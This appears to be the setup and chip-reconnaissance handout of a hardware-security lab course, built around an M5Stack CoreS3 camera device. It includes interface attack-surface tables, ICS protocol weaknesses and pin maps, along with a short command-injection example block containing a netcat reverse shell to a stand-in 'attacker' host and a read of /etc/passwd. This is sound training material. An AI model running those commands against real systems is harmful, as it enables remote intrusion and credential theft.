# L00: Device Setup & Chip Reconnaissance

## Goal
Set up the CoreS3 device, understand its hardware components, and perform initial chip reconnaissance.

## Background

Before attacking any IoT device, identify the main processor, peripheral chips, communication interfaces, and potential attack surfaces. This informs your entire pentest methodology.

**What you're looking for:**
- Main processor (MCU/SoC) - architecture, debug interfaces, memory layout
- Flash memory chips - firmware storage, extraction points
- Communication chips - wireless and wired interfaces
- Debug headers/test points - UART, JTAG, SWD access
- Power management ICs - glitching targets

### Every Interface is an Attack Surface

**Wireless interfaces:**
| Protocol | Common Chips | Frequency | Attack Surface |
|----------|--------------|-----------|----------------|
| **WiFi** | ESP32, RTL8711, CC3200 | 2.4/5 GHz | Network attacks, rogue AP, deauth |
| **BLE** | nRF52, CC2640, ESP32 | 2.4 GHz | GATT overflow, pairing sniff, replay |
| **Zigbee** | CC2530, EFR32, XBee | 2.4 GHz | Key sniffing, replay, network injection |
| **Z-Wave** | ZM5304, EFR32ZG | 800-900 MHz | Weak crypto, replay attacks |
| **LoRa** | SX1276, RFM95 | 433/868/915 MHz | Long-range sniffing, jamming |
| **Sub-GHz RF** | CC1101, Si4432 | 315/433/868 MHz | Replay attacks, signal analysis |
| **NFC/RFID** | PN532, MFRC522 | 13.56 MHz | Card cloning, relay attacks |
| **Cellular** | SIM800, BG96 | Various | SMS injection, APN attacks |
| **Thread/Matter** | Various | 2.4 GHz | Emerging IoT protocol attacks |

**Wired interfaces:**
| Interface | Purpose | Attack Surface |
|-----------|---------|----------------|
| **UART** | Debug console, bootloader | Secrets in logs, shell access, firmware dump |
| **JTAG/SWD** | Debug, programming | Full chip control, memory read/write, bypass security |
| **I2C** | Sensor/peripheral bus | Sniffing, spoofing, injection |
| **SPI** | Flash, displays, sensors | Firmware extraction, data interception |
| **USB** | Power, data, DFU | DFU abuse, memory leaks, HID injection |
| **CAN** | Automotive/industrial | Message injection, replay |
| **RS-485** | Industrial serial bus (Modbus RTU, Profibus, BACnet MS/TP) | Sniffing, command injection, PLC manipulation |
| **RS-232** | Legacy serial (Modbus RTU, DNP3 serial, config ports) | Eavesdropping, command replay, config tampering |
| **Ethernet (ICS)** | Modbus TCP, EtherNet/IP, PROFINET, DNP3, OPC UA | Man-in-the-middle, unauthorized commands, PLC reprogramming |
| **1-Wire** | Sensors, authentication | Key extraction, spoofing |
| **SDIO/MMC** | Storage expansion | Bootloader bypass, firmware injection |

**ICS/SCADA protocols:**
| Protocol | Transport | Common Targets | Key Weakness |
|----------|-----------|----------------|--------------|
| **Modbus RTU/TCP** | RS-485, RS-232, Ethernet | PLCs, RTUs, HMIs | No authentication, no encryption |
| **DNP3** | RS-232, Ethernet | Power grid, water systems | Optional auth (Secure Auth v5), rarely enabled |
| **EtherNet/IP (CIP)** | Ethernet | Allen-Bradley PLCs, drives | Unauthenticated read/write by default |
| **PROFINET** | Ethernet | Siemens PLCs (S7 family) | Weak or no auth on older firmware |
| **BACnet** | Ethernet, RS-485 (MS/TP) | Building automation (HVAC, access control) | No auth in base spec, broadcast discovery |
| **OPC UA** | Ethernet | SCADA gateways, historians | Complex cert handling often misconfigured |
| **S7comm** | Ethernet | Siemens S7-300/400 PLCs | No authentication, direct memory access |
| **HART** | 4-20 mA analog loop | Field instruments, transmitters | Superimposed digital signal, sniffable with modem |
| **IEC 61850 (MMS/GOOSE)** | Ethernet | Substation automation | GOOSE multicast spoofing, no message auth |

**Recon approach:**
1. Visual inspection - Identify antenna connectors, RF shields, chip markings
2. Datasheet lookup - Every chip marking -> find datasheet -> understand interfaces
3. FCC ID lookup - Required for US devices, reveals internal photos and frequencies
4. Logic analyzer - Probe unknown pins to identify protocols
5. Spectrum analysis - SDR to detect active wireless transmissions

**Useful recon resources:**
- [FCC ID Search](https://fccid.io/) - Internal photos, test reports, frequencies for US devices
- [IC ID Search](https://ised-isde.canada.ca/site/spectrum-management-system/en/search) - Canadian equivalent
- [CE Mark Database](https://ec.europa.eu/growth/tools-databases/nando/) - EU device certifications

## Microcontroller vs Microprocessor

### Microprocessor (MPU)
- Runs a full OS (Linux, Android, Windows) with filesystem, shells, process isolation
- **Examples**: Raspberry Pi, routers, smart TVs, NAS devices
- **Attack goals**: Get a shell, escalate privileges, pivot to network

### Microcontroller (MCU)
- **No OS** - runs bare-metal firmware or RTOS (FreeRTOS)
- **No filesystem, no shell** - code runs directly from flash in an infinite loop
- All code runs at same privilege level
- **Examples**: ESP32, STM32, Arduino, PIC, most IoT sensors

**The ESP32-S3 in this device is a microcontroller.**

On a microprocessor, command injection gives you:
```bash
; /bin/sh -i    # Interactive shell
; cat /etc/passwd   # Read files
; nc attacker 4444 -e /bin/sh   # Reverse shell
```

On a microcontroller, **none of this exists**. Realistic attack goals:

| Goal | Why It Matters |
|------|----------------|
| **Leak secrets** | Extract credentials, API keys, PINs from memory |
| **Enable debug mode** | Unlock JTAG, UART, or other debug interfaces |
| **Bypass authentication** | Skip PIN checks, disable security features |
| **Corrupt state** | Overwrite variables to change device behavior |
| **Crash for DoS** | Denial of service, trigger watchdog reset |
| **Dump firmware** | Extract code for reverse engineering |
| **Modify flash** | Persist backdoors or disable security |

### Buffer Overflow Targets on MCUs

Without ASLR, DEP, or stack canaries, overflow targets include:

1. **Overwrite return address** -> Jump to existing function (e.g., `unlock_device()`)
2. **Overwrite function pointer** -> Redirect callback to attacker-controlled code
3. **Overwrite global variables** -> Change `is_authenticated` from 0 to 1
4. **Leak stack/heap data** -> Read adjacent memory containing secrets
5. **Corrupt state machine** -> Skip to "unlocked" state

### Custom Firmware Shells

Many IoT devices implement custom maintenance shells - firmware-defined command parsers that accept specific, hardcoded commands. Discovering what commands exist is part of recon.

## Hardware Overview

### M5Stack CoreS3 Components

| Component | Chip | Function | Lab Relevance |
|-----------|------|----------|---------------|
| MCU | ESP32-S3 | Main processor (dual-core Xtensa LX7) | L04, L06, all firmware labs |
| Flash | Internal 16MB | Firmware storage | L03, L04, L05, L06 |
| PSRAM | Internal 8MB | Extended memory | L13, L16 |
| Camera | GC0308 | Image capture | L16, L17 |
| PMU | AXP2101 | Power management | N/A |
| IMU | BMI270+BMM150 | Accelerometer/Gyro/Magnetometer | Sensor attacks |
| Audio | ES7210+AW88298 | Mic + speaker | N/A |
| Touch | GT911 | Capacitive touch | N/A |
| RTC | BM8563 | Real-time clock | Time-based attacks |
| Ambient Light | LTR-553ALS | Light sensor | N/A |

### Key GPIO Pins

| Function | GPIO | Location | Lab |
|----------|------|----------|-----|
| UART TX (USB) | USB CDC | USB-C port | L01 |
| UART TX (Debug) | GPIO43 | Expansion header pin 14 | L01 |
| I2C SDA (Port.A) | GPIO2 | Port.A / Expansion header | L02, L18 |
| I2C SCL (Port.A) | GPIO1 | Port.A / Expansion header | L02, L18 |
| SPI CLK | GPIO17 | Internal | L03, L19 |
| SPI MOSI | GPIO8 | Internal | L03, L19 |
| SPI CS | GPIO18 | Internal | L03, L19 |
| JTAG TMS | GPIO42 | ESP32-S3 chip (QFN56) | L04 |
| JTAG TCK | GPIO39 | ESP32-S3 chip (QFN56) | L04 |
| JTAG TDI | GPIO41 | ESP32-S3 chip (QFN56) | L04 |
| JTAG TDO | GPIO40 | ESP32-S3 chip (QFN56) | L04 |

## Device Boot Flow

1. **Setup Mode** (first boot or after reset):
   - Creates WiFi AP: `CoreS3-CAM-XXXX` (open, no password)
   - Web setup at http://192.168.4.1

2. **PIN Lock Screen** (after WiFi configured):
   - 6-digit user PIN displayed on first boot
   - Enter PIN to unlock device

3. **Camera View** (after PIN unlock):
   - Main operation mode, web interface available

4. **Admin Mode** (from Camera View):
   - Enter admin PIN for advanced features

## WiFi AP Mode (Setup)

| Setting | Value |
|---------|-------|
| SSID | `CoreS3-CAM-<device_id>` |
| Password | None (open) |
| IP | `192.168.4.1` |

**Note:** Credentials and authentication details are intentionally omitted. Discovering these through reconnaissance and exploitation is part of the lab exercises.

## Lab Steps

### Step 1: Physical Inspection

Examine the device and identify:
1. **USB-C port** - Power, serial console, JTAG
2. **Expansion headers** - GPIO breakout
3. **SD card slot** - Firmware updates (L05)
4. **Screen** - Status display, PIN entry

### Step 2: Connect to Device AP

1. Connect to WiFi: `CoreS3-CAM-XXXX` (shown on device screen)
2. Browse to: http://192.168.4.1
3. Configure WiFi credentials for your network
4. Device will reboot and connect to your WiFi

### Step 3: Unlock Device

1. After WiFi setup, device shows PIN lock screen
2. The 6-digit user PIN is displayed on screen (first boot only)
3. Enter PIN to unlock device

### Step 4: Reset Device for L01

After completing setup, reset the device to observe the boot sequence in L01:

1. Press the reset button (or power cycle)
2. Device will boot into PIN lock screen (already configured)

## Chip Recon Checklist

- [ ] Identify main MCU (ESP32-S3)
- [ ] Locate UART pins (USB + GPIO43)
- [ ] Locate JTAG pins (GPIO39-42)
- [ ] Identify I2C bus (Port.A: GPIO1/2, Internal: GPIO11/12)
- [ ] Identify SPI bus (GPIO8/17/18)
- [ ] Note flash size (16MB)
- [ ] Note PSRAM size (8MB)
- [ ] Review datasheets in `datasheets/`

## Success Criteria

- [ ] Device boots and displays setup AP
- [ ] Serial console connected at 115200 baud
- [ ] Can access web interface at http://192.168.4.1
- [ ] Identified key chips and GPIO pins
- [ ] Know location of debug interfaces (UART, JTAG)

## Next Steps

Proceed to **L01** to begin your hardware security assessment.
